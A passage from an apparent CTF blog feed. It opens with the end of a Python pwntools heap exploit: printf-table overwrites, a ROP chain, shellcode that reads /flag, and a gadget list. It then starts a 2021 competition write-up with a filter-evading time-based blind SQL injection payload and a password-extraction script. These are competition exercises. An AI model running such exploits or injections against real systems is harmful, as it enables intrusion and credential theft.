class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;192.168.166.147&#x27;</span>,<span class=\"number\">58012</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Choice: &#x27;</span>,<span class=\"built_in\">str</span>(c))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,data=<span class=\"string\">&#x27;u&#x27;</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Please input content: &#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bkdoor</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">666</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Please input idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    dele(<span class=\"number\">6</span>-i)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 8 9 11</span></span><br><span class=\"line\">bkdoor(<span class=\"number\">9</span>)</span><br><span class=\"line\">show(<span class=\"number\">9</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">__printf_arginfo_table = libc_base + <span class=\"number\">0x1ed7b0</span></span><br><span class=\"line\">__printf_function_table = libc_base + <span class=\"number\">0x1f1318</span></span><br><span class=\"line\">lock = libc_base + <span class=\"number\">0x222f68</span> <span class=\"comment\"># _rtld_global+3848</span></span><br><span class=\"line\">main_arena_x96 = libc_base + <span class=\"number\">0x1ecbe0</span></span><br><span class=\"line\">magic = libc_base + <span class=\"number\">0x154dea</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">8</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">dele(<span class=\"number\">9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(0x10) # 1 </span></span><br><span class=\"line\"><span class=\"comment\"># add(0x20,&#x27;\\0&#x27;*0x10+p64()) # 2 </span></span><br><span class=\"line\"><span class=\"comment\"># # 7a0 </span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">0x88</span>+p32(<span class=\"number\">0x90</span>*<span class=\"number\">9</span>+<span class=\"number\">1</span>)) <span class=\"comment\"># 2</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x80</span>,p64(libc.sym.exit)*(<span class=\"number\">0x80</span>/<span class=\"number\">8</span>)) <span class=\"comment\"># 3</span></span><br><span class=\"line\">add(<span class=\"number\">0x70</span>)</span><br><span class=\"line\"><span class=\"comment\"># add(0x80) # 4</span></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">11</span>)</span><br><span class=\"line\">dele(<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span>+p64(<span class=\"number\">0x80</span>)+p64(<span class=\"number\">0x91</span>)+p64(__printf_arginfo_table)+p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x88</span>) <span class=\"comment\"># 20</span></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>,p64(__printf_arginfo_table + <span class=\"number\">8</span> - <span class=\"number\">0x378</span>)+p64(libc.sym.exit)*<span class=\"number\">12</span>) <span class=\"comment\"># 21</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">13</span>)</span><br><span class=\"line\">dele(<span class=\"number\">12</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">0x58</span>+p64(<span class=\"number\">0x91</span>)+p64(__printf_function_table)+p64(<span class=\"number\">0</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add_rsp_x28 = libc_base + <span class=\"number\">0x0000000000047445</span></span><br><span class=\"line\">leave_ret = libc_base + <span class=\"number\">0x00000000000578c8</span></span><br><span class=\"line\">ret = libc_base + <span class=\"number\">0x0000000000022679</span></span><br><span class=\"line\">rdi = libc_base +<span class=\"number\">0x0000000000023b6a</span></span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002601f</span></span><br><span class=\"line\">rdx_r12 = libc_base + <span class=\"number\">0x0000000000119211</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,p64(main_arena_x96+<span class=\"number\">0x20</span>)+p64(<span class=\"number\">0</span>)+p64(add_rsp_x28)*<span class=\"number\">2</span>+p64(__printf_function_table+<span class=\"number\">8</span>)+p64(<span class=\"number\">0</span>)+p64(leave_ret)+p64(<span class=\"number\">0</span>)+p64(rdi)+p64(<span class=\"number\">0</span>)+p64(rsi)+p64(__printf_function_table+<span class=\"number\">0x78</span>)+p64(rdx_r12)+p64(<span class=\"number\">0x1000</span>)+p64(<span class=\"number\">0</span>)+p64(libc.sym.read))</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">14</span>)</span><br><span class=\"line\">dele(<span class=\"number\">15</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">0x28</span>+p64(<span class=\"number\">0x91</span>)+p64(lock)+p64(<span class=\"number\">0</span>)) <span class=\"comment\"># _dl_fini+113</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,p64(libc.sym.gets)+p64(magic))</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">16</span>)</span><br><span class=\"line\">dele(<span class=\"number\">17</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">&#x27;\\0&#x27;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x91</span>)+p64(main_arena_x96))</span><br><span class=\"line\"><span class=\"comment\"># add(0x90,&#x27;\\0&#x27;*0x28+p64(0x91)+p64(lock)+p64(0))</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;\\xa0&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">sla(<span class=\"string\">&#x27;Please input size: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x80</span>))</span><br><span class=\"line\"><span class=\"comment\"># show(21)</span></span><br><span class=\"line\"><span class=\"comment\"># dele(20)</span></span><br><span class=\"line\"><span class=\"comment\"># add(1)</span></span><br><span class=\"line\">addr = (libc.sym.__free_hook&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\">fuck = SigreturnFrame()</span><br><span class=\"line\">fuck.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">fuck.rsi = addr</span><br><span class=\"line\">fuck.rdx = <span class=\"number\">0x300</span></span><br><span class=\"line\">fuck.rsp = addr + <span class=\"number\">8</span></span><br><span class=\"line\">fuck.rip = libc.sym.read</span><br><span class=\"line\">lock_rdi = <span class=\"number\">0x222968</span> + libc_base</span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x48</span>+p64(__printf_function_table+<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">mmp = flat([</span><br><span class=\"line\">    <span class=\"number\">0</span>,rdi,((addr)&gt;&gt;<span class=\"number\">12</span>)&lt;&lt;<span class=\"number\">12</span>,rsi,<span class=\"number\">0x2000</span>,rdx_r12,<span class=\"number\">7</span>,<span class=\"number\">0</span>,libc.sym.mprotect,rdi,<span class=\"number\">0</span>,rsi,addr+<span class=\"number\">0x400</span>,rdx_r12,<span class=\"number\">0x100</span>,<span class=\"number\">0</span>,libc.sym.read,libc_base + <span class=\"number\">0x000000000010d5dd</span></span><br><span class=\"line\">])</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">sl(mmp)</span><br><span class=\"line\"></span><br><span class=\"line\">sl(asm(shellcraft.cat(<span class=\"string\">&#x27;/flag&#x27;</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248f1 : pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b69 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000005520f : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000226be : pop rax ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000036174 : pop rax ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b62 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000026019 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef193 : pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025b9a : pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e22f : pop rbp ; pop r12 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f708 : pop rbp ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000013641e : pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248ee : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b66 : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002601d : pop rbp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef197 : pop rbp ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000046077 : pop rbp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000055bb8 : pop rbp ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000226c0 : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000010feb0 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000046073 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000062569 : pop rbx ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000005b937 : pop rbx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000003040a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef192 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025b99 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e22e : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f830 : pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000013641d : pop rbx ; pop rbp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000196c62 : pop rbx ; pop rbp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000226bf : pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002fdaf : pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000119150 : pop rcx ; pop rbp ; pop r12 ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001587d3 : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000010257e : pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000118d4f : pop rcx ; ret 0xf66</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248f2 : pop rdi ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b6a : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248f0 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b68 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002601f : pop rsi ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000248ec : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000023b64 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002601b : pop rsp ; pop r13 ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x00000000000ef195 : pop rsp ; pop r13 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000046075 : pop rsp ; pop r13 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000025b9c : pop rsp ; pop r13 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000008e231 : pop rsp ; pop r14 ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000012cf7e : pop rsp ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x000000000002f70a : pop rsp ; ret</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000099020 : pop rsp ; ret 0xffff</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000022679 : ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Crypto",
                "CTF",
                "Web",
                "Miec",
                "Re",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/2021%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%A4%A7%E8%B5%9B%E4%B9%8B%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E9%A1%B9%E5%86%B3%E8%B5%9BWriteUp/",
            "title": "2021一带一路暨金砖大赛之企业信息系统安全赛项决赛WriteUp",
            "date_published": "2022-06-20T11:21:28.000Z",
            "content_html": "<p>本周三（2022/6/8）我们队伍（<strong>中国矿业大学 02 队</strong>）代表中国矿业大学参加了  <code>2021一带一路暨金砖大赛之企业信息系统安全赛项</code>  的决赛，也顺利地以 <strong>1700/2000</strong> 分拿到了 CTF 的第一名。<br />\n比赛中我们一同解出了 Crypto,Re,Pwn 方向的<strong>所有</strong>赛题，赛后认真对解题思路做了整理，对剩余未解出的少部分赛题也做了复现总结：</p>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<p>感觉题目都是常见的简单知识点，没什么太难的地方，唯一的难点就是有点谜语人，一堆登录框，没任何提示，就是要一顿乱莽</p>\n<h3 id=\"web1\"><a class=\"anchor\" href=\"#web1\">#</a> web1</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDEv\">http://101.133.134.12:8001/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444670/Typera/2023/04/7cc93168358cebd281d36f75a99776e0.png\" alt=\"image-20220608125508509\" /></p>\n<p>一个界面就一直点气球，游戏结束也没见往外发包，就直接看 js 文件，找到存放 flag 的 php</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444663/Typera/2023/04/16f5828c9e0cfdae068d122fef90351c.png\" alt=\"image-20220608125456098\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444663/Typera/2023/04/a428fdb8fa9752169a008288a92d1b8b.png\" alt=\"image-20220609223446550\" /></p>\n<p>访问 flag.php 会跳转到 404，F12 监控一下流量就行</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444664/Typera/2023/04/3ad71e6932bcc48f3adcdf7778e35ca0.png\" alt=\"image-20220609223614556\" /></p>\n<p>flag:88E3773E766EE1FFD98F3FEBE7D876DB</p>\n<h3 id=\"web2\"><a class=\"anchor\" href=\"#web2\">#</a> web2</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDIv\">http://101.133.134.12:8002/</span></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444665/Typera/2023/04/6188997a808503d88da1f67d3c493704.png\" alt=\"image-20220608090837625\" /></p>\n<p>SQL 注入，过滤空格和 for,union, <code>,</code> ,for, 空格，* 等关键字，最关键的是查表，information 没法用了，找个替代表即可</p>\n<p>最后构建出合适的 payload 语句进行时间盲注</p>\n<p><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;^(select(sleep(1))from(mysql.user)where((select(&#123;columns&#125;)from(&#123;table&#125;)where(&#123;limit&#125;))&lt;&#x27;</span>xxx<span class=\"string\">&#x27;))^&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>写个脚本获得密码</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getDatabase</span>(<span class=\"params\">flag=<span class=\"string\">&quot;&quot;</span></span>):  <span class=\"comment\"># 获取数据库名</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> baseurl,sql</span><br><span class=\"line\">    flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">1000</span>):</span><br><span class=\"line\">        low = <span class=\"number\">32</span></span><br><span class=\"line\">        high = <span class=\"number\">128</span></span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt; high:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(mid,<span class=\"built_in\">chr</span>(mid))</span><br><span class=\"line\">            usesql=<span class=\"string\">&quot;1&#x27;^(select(sleep(1))from(mysql.user)where(%s))^&#x27;&quot;</span>%sql.\\</span><br><span class=\"line\">                    replace(<span class=\"string\">&quot;flag&quot;</span>,flag+<span class=\"built_in\">chr</span>(mid))</span><br><span class=\"line\">            <span class=\"comment\"># print(usesql)</span></span><br><span class=\"line\">            start_time=time.time()</span><br><span class=\"line\">            res = requests.post(</span><br><span class=\"line\">                baseurl +<span class=\"string\">&quot;login.php&quot;</span>,</span><br><span class=\"line\">                data=&#123;<span class=\"string\">&quot;uname&quot;</span>:usesql,</span><br><span class=\"line\">                  <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            )</span><br><span class=\"line\">            use_time=time.time()-start_time</span><br><span class=\"line\">            <span class=\"comment\"># print(use_time)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> use_time &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">            mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid &lt;= <span class=\"number\">32</span> <span class=\"keyword\">or</span> mid &gt;= <span class=\"number\">127</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        flag += <span class=\"built_in\">chr</span>(mid - <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i,<span class=\"string\">&quot;flag is -&gt; &quot;</span> + flag)</span><br><span class=\"line\"></span><br><span class=\"line\">columns=<span class=\"string\">&quot;group_concat(passwd)&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 从sys.schema_index_statistics得到表名</span></span><br><span class=\"line\">table=<span class=\"string\">&quot;testx.admin&quot;</span></span><br><span class=\"line\">limit=<span class=\"string\">&quot;&#x27;U&#x27;&lt;&#x27;z&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sql=<span class=\"string\">f&quot;(select(<span class=\"subst\">&#123;columns&#125;</span>)from(<span class=\"subst\">&#123;table&#125;</span>)where(<span class=\"subst\">&#123;limit&#125;</span>))&lt;&#x27;flag&#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">baseurl=<span class=\"string\">&quot;http://101.133.134.12:8002/&quot;</span></span><br><span class=\"line\">getDatabase(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#f9b46e5b6dc40d49fef9c5f287d177ad</span></span><br></pre></td></tr></table></figure></p>\n<p>获得密码的 md5 值，到<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29tZDUuY29tLw==\"> md5 解密网站</span>可知时 5555666</p>\n<p>直接登录 admin:5555666</p>\n<p>获得 flag</p>\n<p AD7008D8BB2DFB6AD521F99A1FF08B54=\"\">flag</p>\n<h3 id=\"web3未解出\"><a class=\"anchor\" href=\"#web3未解出\">#</a> web3（未解出）</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMS4xMzMuMTM0LjEyOjgwMDMv\">http://101.133.134.12:8003/</span></p>\n<p>谜语了可以说是，弄了半天坐大牢不知道干什么，赛后看师傅们说还是 SQL，蚌埠住了，万万没想到会出两道 SQL</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444664/Typera/2023/04/39f4ca5dcdc6510260cb32462e4fc610.png\" alt=\"image-20220609221731113\" 